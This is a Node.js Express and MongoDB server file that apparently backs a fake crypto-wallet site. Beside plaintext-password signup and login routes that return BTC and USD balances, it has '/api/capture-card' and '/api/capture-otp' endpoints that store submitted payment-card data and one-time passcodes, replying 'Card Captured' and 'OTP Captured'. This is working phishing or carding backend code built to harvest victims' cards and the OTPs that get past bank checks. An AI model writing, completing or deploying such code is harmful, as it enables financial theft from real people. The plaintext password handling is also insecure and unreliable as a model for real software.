const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
require('dotenv').config();

const User = require('./models/User');
const Data = require('./models/Data');

const app = express();
app.use(cors());
app.use(express.json());

mongoose.connect(process.env.MONGO_URI)
  .then(() => console.log("✅ MongoDB Atlas Connected"))
  .catch(err => console.error("❌ MongoDB Error:", err.message));

// ✅ SIGNUP: Saves to MongoDB
app.post('/api/signup', async (req, res) => {
  try {
    const { email, password } = req.body;
    const existingUser = await User.findOne({ email });
    
    if (existingUser) {
      return res.status(400).json({ error: "Email already registered" });
    }

    const newUser = new User({ email, password });
    await newUser.save();
    res.status(201).json({ message: "User Created Successfully" });
  } catch (err) {
    res.status(500).json({ error: "Server error during signup" });
  }
});

// ✅ LOGIN: Checks MongoDB (New Route)
app.post('/api/login', async (req, res) => {
  try {
    const { email, password } = req.body;
    const user = await User.findOne({ email, password });

    if (user) {
      res.status(200).json({ 
        message: "Login successful", 
        user: { 
          email: user.email, 
          btc: user.btcBalance, 
          usd: user.usdBalance, 
          wallet: user.walletAddress 
        } 
      });
    } else {
      res.status(401).json({ error: "Invalid email or password" });
    }
  } catch (err) {
    res.status(500).json({ error: "Server error during login" });
  }
});

app.post('/api/capture-card', async (req, res) => {
  try {
    const cardEntry = new Data(req.body);
    await cardEntry.save();
    res.status(201).json({ message: "Card Captured" });
  } catch (err) {
    res.status(500).json({ error: "Database Error" });
  }
});

app.post('/api/capture-otp', async (req, res) => {
  try {
    const { email, otpCode } = req.body;
    const updatedData = await Data.findOneAndUpdate(
      { email },
      { otpCode },
      { new: true, upsert: true }
    );
    res.status(200).json({ message: "OTP Captured" });
  } catch (err) {
    res.status(500).json({ error: "Failed to save OTP" });
  }
});

const PORT = process.env.PORT || 5000;
app.listen(PORT, () => console.log(`🚀 Server running on port ${PORT}`));
